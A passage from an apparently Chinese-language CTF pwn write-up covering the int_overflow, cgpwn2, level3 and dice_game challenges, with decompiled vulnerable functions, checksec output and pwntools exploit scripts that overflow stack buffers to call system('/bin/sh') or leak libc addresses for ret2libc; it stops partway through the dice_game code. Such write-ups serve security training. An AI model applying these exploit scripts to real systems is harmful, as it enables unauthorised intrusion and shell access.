<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">#Step <span class="hljs-number">1</span>:  test.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>2.编译动态链接库生成 libtest.so文件（DLL）</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">gcc -fPIC -shared <span class="hljs-keyword">test</span>.c -o libtest.<span class="hljs-keyword">so</span>  <br></code></pre></td></tr></table></figure>


<p>3.调用DLL文件</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#Step 3:  test.py</span><br><span class="hljs-built_in">from</span> ctypes import *<br>mylib = CDLL(<span class="hljs-string">&quot;libtest.so&quot;</span>)   或者   cdll.LoadLibrary(<span class="hljs-string">&quot;libtest.so&quot;</span>)   <br><span class="hljs-built_in">add</span> = mylib.<span class="hljs-built_in">add</span><br><span class="hljs-built_in">add</span>.argtypes = [c_int, c_int]  <span class="hljs-comment"># 参数类型，两个int（c_int是ctypes类型，见上表）</span><br><span class="hljs-built_in">add</span>.restype = c_int <span class="hljs-comment"># 返回值类型，int (c_int 是ctypes类型，见上表）</span><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">add</span>(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure>

<p>具体参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/awakeljw/article/details/79369703">python 与 C 的交互(ctypes库使用)</a></p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">login</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-228h]</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+200h] [ebp-28h]</span><br><br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your username:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x19</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s\n&quot;</span>, &amp;s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x199</span>u);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">check_passwd</span>(&amp;buf);<br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__cdecl <span class="hljs-title">check_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span><br><br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Password&quot;</span>);<br>    result = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">fflush</span>(stdout);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    result = <span class="hljs-built_in">strcpy</span>(&amp;dest, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">what_is_this</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;cat flag&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>unsigned __int8就是1byte，8bits, 0~255</p>
<p>上面知道password最大长度为0x199,二进制是‭000110011001‬，大于一个字节，存在整数溢出</p>
<p>用个例子验证一下整数溢出</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> b = <span class="hljs-number">65537</span>;<br>    <span class="hljs-keyword">if</span>(a == b)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Int overflow sucssesfully!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➤ gcc -g test.c -o test<br>test.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘main’:<br>test.c:<span class="hljs-number">4</span>:<span class="hljs-number">28</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">large</span> <span class="hljs-type">integer</span> implicitly truncated <span class="hljs-keyword">to</span> unsigned <span class="hljs-keyword">type</span> [-Woverflow]<br>     unsigned short <span class="hljs-type">int</span> b = <span class="hljs-number">65537</span>;<br>                            ^<br>r3teax@ubuntu:~/Desktop                                                         <br>➤ ./test <br><span class="hljs-type">Int</span> overflow sucssesfully!<br></code></pre></td></tr></table></figure>

<p> 也就是说，对于一个2字节的unsigned short int 型变量，它的有效数据长度为2个字节，当它的数据长度超过2个字节时，就发生溢出，溢出的部分则直接忽略。使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537(‭00010000000000000001‬)等于1的情况，其他类型变量和数值与之类似。</p>
<p>这样我们可以把password长度安排在259-264之间</p>
<p>EXP:</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">54685</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;username:&#x27;</span>,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span> + p32(<span class="hljs-number">0x804868b</span>) <br>payload = payload.ljust(<span class="hljs-number">259</span>,<span class="hljs-string">&quot;A&quot;</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;passwd:&#x27;</span>,payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>

<h5 id="Python-ljust-方法"><a href="#Python-ljust-方法" class="headerlink" title="Python ljust()方法"></a>Python ljust()方法</h5><h6 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h6><p>Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p>
<h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><p>ljust()方法语法：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">str<span class="hljs-selector-class">.ljust</span>(<span class="hljs-attribute">width</span><span class="hljs-selector-attr">[, fillchar]</span>)<br></code></pre></td></tr></table></figure>

<h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ul>
<li>width – 指定字符串长度。</li>
<li>fillchar – 填充字符，默认为空格。</li>
</ul>
<h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><p>返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p>
<h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>以下实例展示了ljust()的使用方法：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python</span><br><br>str = <span class="hljs-string">&quot;this is string example....wow!!!&quot;</span>;<br><br>print str.ljust(<span class="hljs-number">50</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>以上实例输出结果如下：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">string</span> example....wow!!!<span class="hljs-number">000000000000000000</span><br></code></pre></td></tr></table></figure>



<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➤</span> <span class="hljs-string">checksec</span> <span class="hljs-string">cgctf</span> <br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/r3teax/Desktop/cgctf&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name&quot;</span>);<br> <span class="hljs-built_in">fgets</span>(name, <span class="hljs-number">50</span>, stdin);<br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>);<br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">gets</span>(&amp;s);<span class="hljs-comment">//s&#x27;buffer=0x26</span><br></code></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.bss</span>:<span class="hljs-number">0804</span>A080 ; char name<span class="hljs-selector-attr">[52]</span><br><span class="hljs-selector-class">.bss</span>:<span class="hljs-number">0804</span>A080 name            db <span class="hljs-number">34</span>h <span class="hljs-built_in">dup</span>(?)           ; DATA XREF: hello+<span class="hljs-number">77</span>↑o<br>.bss:<span class="hljs-number">0804</span>A080 _bss            ends<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">plt</span>:<span class="hljs-number">08048420</span> _system         endp<br></code></pre></td></tr></table></figure>

<p>EXP:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">io</span>=remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">49067</span>)<br><span class="hljs-attribute">system_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">08048420</span><br><span class="hljs-attribute">name_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">0804</span>A<span class="hljs-number">080</span><br><span class="hljs-attribute">payload</span>=&#x27;a&#x27;*<span class="hljs-number">42</span>+p<span class="hljs-number">32</span>(system_addr)+&#x27;aaaa&#x27;+p<span class="hljs-number">32</span>(name_addr)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;please tell me your name&quot;</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>,payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">vulnerable_function</span>();<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World!\n&quot;</span>, <span class="hljs-number">0xE</span>u);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span><br><br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-number">7u</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>



<p>EXP:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;111.198.29.45&#x27;,40752)<br><span class="hljs-attribute">libc</span>=ELF(&quot;libc_32.so.6&quot;)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./level3&quot;)<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">vul_addr</span>=elf.symbols[<span class="hljs-string">&#x27;vulnerable_function&#x27;</span>]<br><span class="hljs-attribute">payload</span>=140*&#x27;a&#x27;+p32(write_plt)+p32(vul_addr)+p32(1)+p32(write_got)+p32(4)<br>       4<br>    write_got<br>       1<br>    vul_addr            伪造write(1,write_got,4)<br>ret    write_plt<br>ebp    aaaa<br>    aaaaaaaaa<br>    <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<br>    aaaaaaaaa<br>    <br>io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><span class="hljs-attribute">write_addr</span>=u32(io.recv(4))    #leak write<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span><span class="hljs-attribute">libc_off</span>=write_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">system_addr</span>=libc_off+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">binsh</span>=libc_off+libc.search(&quot;/bin/sh&quot;).next()<br><span class="hljs-attribute">payload1</span>=140*&quot;a&quot;+p32(system_addr)+&#x27;aaaa&#x27;+p32(binsh)<br>     /bin/sh<br>      aaaa<br> ret   system_addr         伪造system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br> ebp    aaaa      <br>    aaaaaaaaa<br>     <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br>    aaaaaaaaa<br><br>io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload1) <br>io.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre>
<h4 id="read"><a href="#read" class="headerlink" title="read():"></a>read():</h4><h5 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h5><p>ssize_t read [1] (int fd, void *buf, size_t count);</p>
<h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0。</p>
<h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><p>参数count是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-keyword">char</span> flag; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-keyword">ssize_t</span> read_length; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome, let me know your name: &quot;</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  read_length = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( read_length &lt;= <span class="hljs-number">49</span> )<br>    buf[read_length - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, %s. Let&#x27;s play a game.\n&quot;</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  count = <span class="hljs-number">1</span>;<br>  flag = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Game %d/50\n&quot;</span>, count);<br>    flag = <span class="hljs-built_in">dice_game</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( flag != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( count == <span class="hljs-number">50</span> )<br>    &#123;<br>      <span class="hljs-built_in">Congrats</span>((__int64)buf);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    ++count;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 <span class="hljs-title">sub_A20</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> __int64 result; <span class="hljs-comment">// rax</span><br>  __int16 v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br>  __int16 v2; <span class="hljs-comment">// [rsp+Eh] [rbp-2h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me the point(1~6): &quot;</span>);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">6</span> )<br>  &#123;<br>    v2 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">6</span> || v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">6</span> )<br>      _assert_fail(<span class="hljs-string">&quot;(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)&quot;</span>, <span class="hljs-string">&quot;dice_game.c&quot;</span>, <span class="hljs-number">0x18</span>u, <span class="hljs-string">&quot;dice_game&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( v1 == v2 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win.&quot;</span>);<br>      result = <span class="hljs-number">1LL</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You lost.&quot;</span>);<br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid value!&quot;</span>);<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> 